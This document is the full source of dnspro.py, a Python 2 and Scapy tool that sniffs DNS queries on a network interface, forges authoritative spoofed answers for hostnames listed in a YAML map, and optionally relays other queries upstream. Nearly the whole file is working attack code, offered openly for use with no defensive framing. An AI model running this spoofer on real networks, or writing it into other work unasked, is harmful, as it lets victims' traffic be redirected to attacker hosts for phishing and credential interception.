#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
dnspro.py -- DNS spoof / relay for Python-2.7 + Scapy-2.4.5
This script intercepts DNS queries on an interface, spoofs answers for
matched hostnames according to a YAML mapping, and optionally relays
unmatched queries to an upstream resolver.

Requires root privileges (e.g. sudo) to run.
"""

from __future__ import print_function, absolute_import

import argparse
# backport for Python 2.7
try:
    import ipaddress
except ImportError:
    sys.exit("Install the 'ipaddress' back-port: sudo pip install ipaddress")
import logging
import os
import signal
import socket
import sys
import threading
import time

# YAML mapping loader
try:
    import yaml
except ImportError:
    sys.exit("Install PyYAML for Python 2: sudo pip2 install 'PyYAML<5.4'")

# Scapy imports
from scapy.all import (
    DNS, DNSQR, DNSRR,
    IP, IPv6,
    UDP, TCP,
    send, sniff,
)

# Helpers

def _u(s):
    # Ensure unicode under Py2
    try:
        return unicode(s)
    except NameError:
        return s

# normalize hostname

def _normalise_qname(name):
    return _u(name).rstrip('.') .lower()

class DNSSpoofer(threading.Thread):
    """Thread that handles DNS spoofing over UDP and TCP."""
    def __init__(self, iface, mapping, upstream='8.8.8.8', relay=False, ttl=300, bpf=None):
        threading.Thread.__init__(self)
        self.daemon = True
        self.iface = iface
        self.mapping = mapping
        self.upstream = upstream
        self.relay = relay
        self.ttl = ttl
        self.bpf = bpf or 'udp or tcp port 53'
        self._running = threading.Event()
        self._running.set()
        self._tcp_thr = None

    def _lookup(self, qname):
        qn = _normalise_qname(qname)
        if qn in self.mapping:
            val = self.mapping[qn]
            return val if isinstance(val, list) else [val]
        for pattern, val in self.mapping.items():
            if pattern.startswith('*.') and qn.endswith(pattern[2:]):
                return val if isinstance(val, list) else [val]
        return None

    def _build_answers(self, qname, ips, qtype):
        answers = None
        for ip in ips:
            rr = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=str(ip))
            answers = rr if answers is None else answers / rr
        return answers

    def _forge_response(self, pkt, ips):
        q = pkt[DNSQR]
        answer = self._build_answers(q.qname, ips, q.qtype)
        dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=q, ancount=len(ips), an=answer)
        if IP in pkt:
            ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        else:
            ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
        if UDP in pkt:
            udp = UDP(sport=53, dport=pkt[UDP].sport)
            return ip_layer / udp / dns
        else:
            tcp = TCP(sport=53, dport=pkt[TCP].sport,
                      flags='PA', seq=pkt[TCP].ack,
                      ack=pkt[TCP].seq + len(pkt[TCP].payload))
            return ip_layer / tcp / dns

    def _process_udp(self, pkt):
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
            return
        qname = pkt[DNSQR].qname.decode()
        ips = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
            logging.info('Spoofed %s -> %s', qname, ','.join(ips))
        elif self.relay:
            self._relay_upstream(pkt)

    def _process_tcp(self, pkt):
        self._process_udp(pkt)

    def _relay_upstream(self, pkt):
        qname = pkt[DNSQR].qname.decode()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            logging.warning('Upstream timeout for %s', qname)
            return
        finally:
            sock.close()
        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp_layer = UDP(sport=53, dport=pkt[UDP].sport)
        send(ip_layer / udp_layer / DNS(data), iface=self.iface, verbose=0)

    def run(self):
        logging.info('Starting DNS spoofing on %s relay=%s filter="%s"',
                     self.iface, self.relay, self.bpf)
        self._tcp_thr = threading.Thread(target=lambda: sniff(
            iface=self.iface,
            filter='tcp and (%s)' % self.bpf,
            prn=self._process_tcp,
            store=0,
            stop_filter=lambda *_: not self._running.is_set(),
        ))
        self._tcp_thr.daemon = True
        self._tcp_thr.start()
        sniff(iface=self.iface,
              filter='udp and (%s)' % self.bpf,
              prn=self._process_udp,
              store=0,
              stop_filter=lambda *_: not self._running.is_set())

    def stop(self):
        self._running.clear()
        if self._tcp_thr:
            self._tcp_thr.join(0.5)


def load_mapping(path):
    raw = yaml.safe_load(open(path, 'rb'))
    if not isinstance(raw, dict):
        raise ValueError('YAML must be a host→IP dictionary')
    mapping = {}
    for host, value in raw.items():
        key = _normalise_qname(host)
        ips = value if isinstance(value, list) else [value]
        valid = []
        for ip in ips:
            try:
                ipaddress.ip_address(_u(ip))
                valid.append(str(ip))
            except Exception:
                logging.warning('Ignoring invalid IP %s for host %s', ip, key)
        if valid:
            mapping[key] = valid if len(valid)>1 else valid[0]
    return mapping


def setup_logging(verbose, quiet):
    lvl = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
    logging.basicConfig(level=lvl, format='%(asctime)s %(levelname).1s: %(message)s')


def main():
    parser = argparse.ArgumentParser(description='dnspro.py for Python2 + Scapy')
    parser.add_argument('-i','--iface', required=True)
    parser.add_argument('-m','--map', required=True)
    parser.add_argument('--relay', action='store_true')
    parser.add_argument('--upstream', default='8.8.8.8')
    parser.add_argument('--ttl', type=int, default=300)
    parser.add_argument('--bpf')
    parser.add_argument('-v','--verbose', action='store_true')
    parser.add_argument('-q','--quiet', action='store_true')
    args = parser.parse_args()
    setup_logging(args.verbose, args.quiet)
    try:
        mapping = load_mapping(args.map)
    except Exception as e:
        logging.error(str(e)); sys.exit(1)
    if not mapping:
        logging.error('No valid mappings'); sys.exit(1)
    sp = DNSSpoofer(args.iface, mapping, upstream=args.upstream,
                    relay=args.relay, ttl=args.ttl, bpf=args.bpf)
    sp.start()
    signal.signal(signal.SIGINT, lambda *_: sp.stop())
    sp.join()

if __name__ == '__main__':
    main()